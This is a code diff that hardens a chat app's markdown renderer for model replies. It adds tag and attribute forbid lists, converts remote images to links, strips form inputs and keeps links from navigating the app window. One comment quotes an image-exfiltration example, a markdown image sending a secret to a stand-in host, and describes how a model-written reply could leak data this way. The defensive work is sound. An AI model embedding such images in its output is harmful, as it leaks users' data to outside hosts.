@@ -4,6 +4,7 @@
 // Pipeline:
 //   markdown text → marked (parser, custom code renderer + hljs)
 //                 → DOMPurify (sanitize)
+//                 → neutraliseRemoteContent (remote images become links)
 //                 → innerHTML
 //                 → post-mount DOM walk (copy buttons, citations, search)
 //
@@ -217,6 +218,81 @@ function scrubSvg(container) {
   }
 }
 
+// What a reply's HTML may never carry, on top of DOMPurify's defaults.
+// Each of these can make the webview fetch a remote URL (a `style` with
+// url(), `srcset`, `background`, the media elements) or post somewhere
+// (`form`), and a `style` attribute can also paint over the app itself.
+// marked emits none of them (tables align with the `align` attribute), so
+// only raw HTML a model wrote loses anything. The page's content-security
+// policy (the <meta> at the top of index.html) is the second lock on the
+// same door: keep both.
+const REPLY_FORBID_TAGS = ['style', 'form', 'video', 'audio', 'source', 'track', 'picture'];
+const REPLY_FORBID_ATTR = ['style', 'srcset', 'background'];
+
+// Second pass over SANITIZED reply HTML: nothing in it may load from
+// anywhere but the reply itself.
+//   • <img> whose bytes are not inline (replyImageIsInline) becomes a link
+//     carrying the alt text, or plain text when the source is not a web
+//     address. This is the fix for the image-exfiltration hole: a reply
+//     with `![x](https://host/?d=secret)` used to be fetched on render.
+//   • <input> survives only as the disabled checkbox of a GFM task list
+//     (`<input type="image" src>` loads, and a text field has no business
+//     in a reply).
+//   • inline <svg> gets the same narrow scrub as a mermaid diagram.
+// Runs in a <template>, whose content is inert: nothing parsed into it
+// loads or executes.
+function neutraliseRemoteContent(html) {
+  if (!/<(img|input|svg)\b/i.test(html)) return html;
+  const tpl = document.createElement('template');
+  tpl.innerHTML = html;
+  const root = tpl.content;
+  root.querySelectorAll('img').forEach((img) => {
+    const src = img.getAttribute('src') || '';
+    if (replyImageIsInline(src)) return;
+    const url = externalLinkTarget(src);
+    const label = (img.getAttribute('alt') || '').trim() || url || src;
+    const node = document.createElement(url ? 'a' : 'span');
+    node.className = 'ek-remote-image';
+    if (url) {
+      node.setAttribute('href', url);
+      node.setAttribute('title', url);
+    }
+    node.textContent = label;
+    img.replaceWith(node);
+  });
+  root.querySelectorAll('input').forEach((input) => {
+    if ((input.getAttribute('type') || '').toLowerCase() !== 'checkbox') {
+      input.remove();
+      return;
+    }
+    for (const attr of Array.from(input.attributes)) {
+      if (attr.name !== 'type' && attr.name !== 'checked') input.removeAttribute(attr.name);
+    }
+    input.setAttribute('disabled', '');
+  });
+  root.querySelectorAll('svg').forEach((svg) => scrubSvg(svg));
+  return tpl.innerHTML;
+}
+
+// A click on a link in a reply must never navigate the app's own window:
+// that would replace the whole interface with a remote page. http(s) and
+// mailto links open in the default browser, an in-page anchor (#fn1)
+// scrolls, and anything else does nothing.
+function handleReplyLinkClick(e) {
+  const a = e.target && e.target.closest ? e.target.closest('a[href]') : null;
+  if (!a || !e.currentTarget.contains(a)) return;
+  const href = a.getAttribute('href') || '';
+  if (href.trim().charAt(0) === '#') return;
+  e.preventDefault();
+  const url = externalLinkTarget(href);
+  if (!url) return;
+  try {
+    getShellApi()?.open(url);
+  } catch (_) {
+    /* no opener available: stay where we are */
+  }
+}
+
 // Add a "Copy" button to every code block in `root`. Idempotent: bails if
 // a button already exists on a given <pre> (so re-runs from the useEffect
 // don't stack buttons).
@@ -396,8 +472,13 @@ function MarkdownMessage({ content, highlightRegex, sources, streaming }) {
     }
     // DOMPurify defaults already block <script>, event handlers, javascript:
     // URLs, etc. We add data-lang to ADD_ATTR so our code-block language
-    // badge survives sanitization.
-    const clean = DOMPurify.sanitize(raw, { ADD_ATTR: ['data-lang'] });
+    // badge survives sanitization, forbid what could load or post
+    // (REPLY_FORBID_*), then turn every non-inline image into a link.
+    const clean = neutraliseRemoteContent(DOMPurify.sanitize(raw, {
+      ADD_ATTR: ['data-lang'],
+      FORBID_TAGS: REPLY_FORBID_TAGS,
+      FORBID_ATTR: REPLY_FORBID_ATTR,
+    }));
     return restoreMathSegments(clean, segments, renderKatexSegment);
   }, [content, streaming]);
 
@@ -440,6 +521,8 @@ function MarkdownMessage({ content, highlightRegex, sources, streaming }) {
     <div
       ref={ref}
       className="ek-md"
+      onClick={handleReplyLinkClick}
+      onAuxClick={handleReplyLinkClick}
       dangerouslySetInnerHTML={{ __html: html }}
     />
   );
